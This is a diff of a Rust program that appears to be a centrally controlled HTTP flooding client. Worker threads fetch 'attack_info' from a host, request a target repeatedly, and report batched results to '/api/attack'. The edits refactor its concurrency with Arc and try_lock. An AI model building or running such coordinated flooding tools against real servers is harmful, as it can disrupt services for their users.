@@ -1,3 +1,4 @@
+use std::cell::Ref;
 use serde_json;
 use std::sync::{Arc, Mutex, Condvar};
 use dashmap::DashMap;
@@ -8,7 +9,7 @@ struct Client {
     attacking: bool,
     workers: Vec<Arc<(Mutex<Worker>, Condvar)>>,
     worker_threads: Vec<std::thread::JoinHandle<()>>,
-    results: DashMap<u32, Vec<String>>,
+    results: Arc<DashMap<u32, Vec<String>>>,
 }
 
 struct Worker {
@@ -17,11 +18,11 @@ struct Worker {
     attacking: bool,
     address: String,
     client: reqwest::blocking::Client,
-    results: DashMap<u32, Vec<String>>,
+    results: Arc<DashMap<u32, Vec<String>>>
 }
 
 impl Worker {
-    fn new(addr: String, host: String, map: DashMap<u32, Vec<String>>, id: u32) -> Worker {
+    fn new(addr: String, host: String, map: Arc<DashMap<u32, Vec<String>>>, id: u32) -> Worker {
         let client = reqwest::blocking::Client::new();
         let mut add = host.clone();
         add.push_str("/attack_info");
@@ -35,7 +36,9 @@ impl Worker {
             let body = res.text().unwrap();
             let response_body = serde_json::json!({"code": code, "body":body});
             // self.client.post(self.host_address.as_str()).json(&response_body).send().unwrap();
-            self.results.get_mut(&self.id).unwrap().push(response_body.to_string());
+            // self.results.get(&self.id).unwrap().push(response_body.to_string());
+            let local_instance =  self.results.clone();
+            local_instance.get_mut(&self.id).unwrap().push(response_body.to_string());
             return 0;
         }
         1
@@ -50,9 +53,10 @@ impl Client {
             attacking: false,
             workers: vec![],
             worker_threads: vec![],
-            results: DashMap::with_capacity(4),
+            results: Arc::new(DashMap::with_capacity(4)),
         };
-        let thread_count = std::thread::available_parallelism().unwrap().get() * 4;
+        // let thread_count = std::thread::available_parallelism().unwrap().get() * 4;
+        let thread_count = 4;
         cl.worker_threads.reserve(thread_count);
         for i in 0..thread_count {
             cl.results.insert(i as u32, vec![]);
@@ -79,13 +83,19 @@ impl Client {
             println!("can attack");
             self.attacking = true;
             for el in self.workers.iter_mut() {
-                println!("main thread command: huh?");
                 let clone_el = el.clone();
                 let (elem, cv) = &*clone_el;
-                let mut worker = elem.lock().unwrap();
-                worker.address = self.address.clone();
-                worker.attacking = true;
-                cv.notify_one();
+                let worker_lock = elem.try_lock();
+                match worker_lock {
+                    Ok(_) => {
+                        let mut worker = worker_lock.unwrap();
+                        println!("main thread captured mutex {}: ", worker.id);
+                        worker.address = self.address.clone();
+                        worker.attacking = true;
+                        cv.notify_one();
+                    }
+                    Err(_) => {continue;}
+                }
             }
         } else {
             println!("can't attack");
@@ -94,9 +104,16 @@ impl Client {
                 let clone_el = el.clone();
                 println!("main thread command: is to stop");
                 let (elem, _cv) = &*clone_el;
-                let mut worker = elem.lock().unwrap();
-                worker.address = self.address.clone();
-                worker.attacking = false;
+                let worker_lock = elem.try_lock();
+                match worker_lock {
+                    Ok(_) => {
+                        let mut worker = worker_lock.unwrap();
+                        println!("main thread captured mutex {}: ", worker.id);
+                        worker.address = self.address.clone();
+                        worker.attacking = false;
+                    }
+                    Err(_) => {continue;}
+                }
             }
         }
     }
@@ -116,6 +133,7 @@ impl Client {
             for _ in 0..5 {
                 _r = w.start_requesting();
             }
+            // println!("mutex is released after sending {}", w.id);
         }
     }
 
@@ -123,7 +141,7 @@ impl Client {
         let cl = reqwest::blocking::Client::new();
         let max_size = self.workers.capacity();
         let mut i = 0;
-        while i < max_size {
+        while i < 4 {
             let ind = i.to_owned().clone();
             let worker = self.workers[ind].clone();
             self.worker_threads.push(std::thread::spawn(move || {
@@ -142,11 +160,13 @@ impl Client {
                 request_body_vec.extend(el.value().to_owned());
                 if amount_of_requests >= 200 {
                     self.results.get_mut(&el.key()).unwrap().clear();
+
                     cl.post(format!("{}/api/attack", self.host_address.as_str())).json(&request_body_vec).send().unwrap();
                     request_body_vec.clear();
                     amount_of_requests = 0;
                 }
             }
+            println!("{}", amount_of_requests.to_string());
             self.can_attack();
         }
 
